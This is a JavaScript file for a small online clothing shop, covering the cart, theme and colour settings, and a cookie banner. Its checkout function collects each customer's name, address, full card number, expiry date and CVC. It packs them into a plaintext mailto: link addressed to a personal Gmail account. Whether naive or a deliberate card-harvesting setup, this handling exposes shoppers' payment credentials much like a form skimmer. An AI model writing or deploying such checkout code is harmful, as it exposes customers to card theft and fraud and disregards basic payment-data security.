let cart = [];
const cartCount = document.getElementById('cart-count');
const cartDropdown = document.getElementById('cart-dropdown');
const cartItemsList = document.getElementById('cart-items');
const cartTotalSpan = document.getElementById('cart-total');
const checkoutLink = document.getElementById('checkout-link');

function addToCart(name, price){
  const sizeSelect = document.getElementById('size-select');
  const size = sizeSelect.value;
  cart.push({name:name+" ("+size+")", price});
  updateCartUI();
}

function updateCartUI(){
  cartCount.textContent = cart.length;
  cartItemsList.innerHTML = '';
  let total = 0;
  cart.forEach(item=>{
    const li = document.createElement('li');
    li.textContent = `${item.name} - $${item.price}`;
    cartItemsList.appendChild(li);
    total+=item.price;
  });
  cartTotalSpan.textContent = total;

  const name=document.getElementById('customer-name').value||'';
  const email=document.getElementById('customer-email').value||'';
  const address=document.getElementById('customer-address').value||'';
  const card=document.getElementById('customer-card').value||'';
  const exp=document.getElementById('customer-exp').value||'';
  const cvc=document.getElementById('customer-cvc').value||'';

  const subject=encodeURIComponent("Innocent Clothing Order");
  const body=encodeURIComponent(
    `Name: ${name}\nEmail: ${email}\nAddress: ${address}\nCard: ${card}\nExpiry: ${exp}\nCVC: ${cvc}\n\nOrder Items:\n${cart.map(i=>i.name+" - $"+i.price).join("\n")}\nTotal: $${total}`
  );
  checkoutLink.href=`mailto:davenanother@gmail.com?subject=${subject}&body=${body}`;
}

// Toggle cart
document.getElementById('cart-icon').addEventListener('click',()=>{
  cartDropdown.style.display = cartDropdown.style.display==='block'?'none':'block';
});

// Settings panel
const settingsPanel=document.getElementById('settings-panel');
document.getElementById('settings-icon').addEventListener('click',()=>{settingsPanel.style.right='20px';});
document.getElementById('close-settings').addEventListener('click',()=>{settingsPanel.style.right='-300px';});

// Theme select
document.getElementById('theme-select').addEventListener('change',e=>{
  document.body.className=e.target.value;
});

// Color pickers
document.getElementById('primary-color').addEventListener('input',e=>{
  document.body.style.setProperty('--primary',e.target.value);
});
document.getElementById('secondary-color').addEventListener('input',e=>{
  document.body.style.setProperty('--secondary',e.target.value);
});

// Cookies
const cookiesBanner=document.getElementById('cookies-banner');
document.getElementById('accept-cookies').addEventListener('click',()=>{cookiesBanner.style.display='none';});
